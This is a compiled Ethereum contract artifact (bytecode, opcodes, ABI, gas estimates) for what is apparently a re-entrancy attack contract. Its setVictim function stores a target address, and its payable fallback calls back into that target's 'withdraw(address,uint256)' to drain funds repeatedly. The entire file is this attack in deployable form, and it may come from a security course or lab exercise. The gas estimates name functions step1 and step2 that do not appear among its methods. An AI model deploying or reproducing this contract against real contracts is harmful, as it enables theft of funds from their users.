{
	"data": {
		"bytecode": {
			"object": "60606040525b33600060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b5b610308806100576000396000f3006060604052361561004a576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680630b439621146101bd578063722713f7146101f3575b6101bb5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614156101b857600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1660405180807f776974686472617728616464726573732c75696e743235362900000000000000815250601901905060405180910390207c0100000000000000000000000000000000000000000000000000000000900430346040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001828152602001925050506000604051808303816000876161da5a03f192505050505b5b565b005b34156101c557fe5b6101f1600480803573ffffffffffffffffffffffffffffffffffffffff16906020019091905050610219565b005b34156101fb57fe5b6102036102bc565b6040518082815260200191505060405180910390f35b3373ffffffffffffffffffffffffffffffffffffffff16600060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff161415156102765760006000fd5b80600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b5b50565b60003073ffffffffffffffffffffffffffffffffffffffff163190505b905600a165627a7a723058204aac9ffa39293c9728b3013318704bde36d77db1d4c0802b8bb1cd09b4a6bedb0029",
			"opcodes": "PUSH1 0x60 PUSH1 0x40 MSTORE JUMPDEST CALLER PUSH1 0x0 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP JUMPDEST JUMPDEST PUSH2 0x308 DUP1 PUSH2 0x57 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN STOP PUSH1 0x60 PUSH1 0x40 MSTORE CALLDATASIZE ISZERO PUSH2 0x4A JUMPI PUSH1 0x0 CALLDATALOAD PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV PUSH4 0xFFFFFFFF AND DUP1 PUSH4 0xB439621 EQ PUSH2 0x1BD JUMPI DUP1 PUSH4 0x722713F7 EQ PUSH2 0x1F3 JUMPI JUMPDEST PUSH2 0x1BB JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0x1B8 JUMPI PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x40 MLOAD DUP1 DUP1 PUSH32 0x776974686472617728616464726573732C75696E743235362900000000000000 DUP2 MSTORE POP PUSH1 0x19 ADD SWAP1 POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 SHA3 PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV ADDRESS CALLVALUE PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP3 POP POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 PUSH2 0x61DA GAS SUB CALL SWAP3 POP POP POP POP JUMPDEST JUMPDEST JUMP JUMPDEST STOP JUMPDEST CALLVALUE ISZERO PUSH2 0x1C5 JUMPI INVALID JUMPDEST PUSH2 0x1F1 PUSH1 0x4 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP2 SWAP1 POP POP PUSH2 0x219 JUMP JUMPDEST STOP JUMPDEST CALLVALUE ISZERO PUSH2 0x1FB JUMPI INVALID JUMPDEST PUSH2 0x203 PUSH2 0x2BC JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO ISZERO PUSH2 0x276 JUMPI PUSH1 0x0 PUSH1 0x0 REVERT JUMPDEST DUP1 PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP JUMPDEST JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 ADDRESS PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE SWAP1 POP JUMPDEST SWAP1 JUMP STOP LOG1 PUSH6 0x627A7A723058 SHA3 0x4a 0xac SWAP16 0xfa CODECOPY 0x29 EXTCODECOPY SWAP8 0x28 0xb3 ADD CALLER XOR PUSH17 0x4BDE36D77DB1D4C0802B8BB1CD09B4A6BE 0xdb STOP 0x29 ",
			"linkReferences": {}
		},
		"gasEstimates": {
			"creation": {
				"codeDepositCost": "155200",
				"executionCost": "20297"
			},
			"internal": {
				"()": "infinite",
				"step1(uint256)": "infinite",
				"step2(uint256)": "infinite"
			},
			"external": {
				"": "infinite",
				"balanceOf()": "infinite",
				"setVictim(address)": "infinite"
			}
		},
		"methodIdentifiers": {
			"balanceOf()": "722713f7",
			"setVictim(address)": "0b439621"
		}
	},
	"abi": [
		{
			"constant": false,
			"inputs": [
				{
					"name": "target",
					"type": "address"
				}
			],
			"name": "setVictim",
			"outputs": [],
			"payable": false,
			"type": "function",
			"stateMutability": "nonpayable"
		},
		{
			"constant": false,
			"inputs": [],
			"name": "balanceOf",
			"outputs": [
				{
					"name": "",
					"type": "uint256"
				}
			],
			"payable": false,
			"type": "function",
			"stateMutability": "nonpayable"
		},
		{
			"inputs": [],
			"payable": true,
			"type": "constructor",
			"stateMutability": "payable"
		},
		{
			"payable": true,
			"type": "fallback",
			"stateMutability": "payable"
		}
	]
}